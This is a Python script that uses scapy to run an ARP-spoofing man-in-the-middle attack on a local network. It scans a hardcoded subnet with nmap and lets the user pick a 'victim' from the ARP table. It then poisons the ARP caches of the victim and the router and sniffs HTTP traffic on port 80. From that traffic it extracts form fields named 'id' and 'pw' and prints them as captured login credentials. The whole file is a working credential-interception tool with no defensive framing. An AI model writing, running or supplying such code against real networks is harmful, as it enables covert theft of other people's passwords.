import re
from subprocess import run
from scapy import layers
from scapy.all import send, sniff
from scapy.packet import Raw
import time
print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
      "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")


def get_ip_mac(arp_string):
    string_list = arp_string.split("\n")
    result_list = []
    pattern = r"(.*)\((.*)\) at ([0-9a-f:]+) (.*)"
    for string in string_list:
        match = re.search(pattern, string)
        if match:
            result_list.append((match.group(2), match.group(3), match.group(4)))
    return result_list


def cli_main():
    choice = int(
        input("Do you want to:\n 1. Input IP\n 2. See all possible IP Addresses?\n")
    )

    if choice == 1:
        victim_ip = input("Enter the victim's IP address")
        router_ip = input("Enter the router's IP address: ")
    else:
        # ip scan
        print("scanning ip addresses in local network...")
        nmap = run(["nmap", "-sP", "10.123.144.*"], capture_output=True)
        print("exit status:", nmap.returncode)

        nmap_result = nmap.stdout.decode().split("\n")[-2][5:]
        print(f"{nmap_result}\n")

        time.sleep(2)

        arp = run(["arp", "-a"], capture_output=True)
        ip_list = get_ip_mac(arp.stdout.decode())
        router_ip, ip_list = ip_list[0][0], ip_list[1:]

        for index, (ip_addr, mac_addr, post_fix) in enumerate(ip_list):
            print(f"[{index+1}]: {ip_addr} at {mac_addr} {post_fix}")

        victim_choice = int(input(f"Select victim number (between {1} - {len(ip_list)}): "))
        victim_ip = ip_list[victim_choice - 1][0]

    print(f"victim ip : {victim_ip}, router ip : {router_ip}")
    return victim_ip, router_ip


flag = True
def process_sniff(packet):
    global flag
    if Raw in packet:
        try:
            if flag:
                # flag -= 1

                packet_string = packet[Raw].load.decode("utf-8")
                print(packet_string)

                user_name_pattern = (
                    r'Content-Disposition: form-data; name="id"\r\n\r\n(.*)\r\n'
                )
                password_pattern = (
                    r'Content-Disposition: form-data; name="pw"\r\n\r\n(.*)\r\n'
                )

                user_name = re.search(user_name_pattern, packet_string).group(1)
                password = re.search(password_pattern, packet_string).group(1)

                print(
                    "\n[!] ===================== VICTIM LOGIN INFO FOUND =======================\n"
                )
                print(f"Username: {user_name}")
                print(f"Password: {password}")
                print(
                 "\n==========================================================================\n"
                )
        except Exception as e:
            pass
        flag = flag != True


def spoof(victim_ip, router_ip):
    scapy_obj = layers.l2

    victim_mac = scapy_obj.getmacbyip(victim_ip)
    router_mac = scapy_obj.getmacbyip(router_ip)

    victim_spoofing = scapy_obj.ARP(
        pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, op="is-at"
    )
    server_spoofing = scapy_obj.ARP(
        pdst=router_ip, hwdst=router_mac, psrc=victim_ip, op="is-at"
    )
    victim_restore = scapy_obj.ARP(
        pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac, op="is-at"
    )
    server_restore = scapy_obj.ARP(
        pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac, op="is-at"
    )

    try:
        while True:
            send(victim_spoofing, verbose=0)
            send(server_spoofing, verbose=0)
            sniff(filter="port 80", timeout=1, prn=process_sniff)
    except KeyboardInterrupt:
        send(victim_restore, verbose=0)
        send(server_restore, verbose=0)


victim_ip, router_ip = cli_main()
print("\n[!] ===================== SNIFFING VICTIM PACKETS =======================\n")
spoof(victim_ip, router_ip)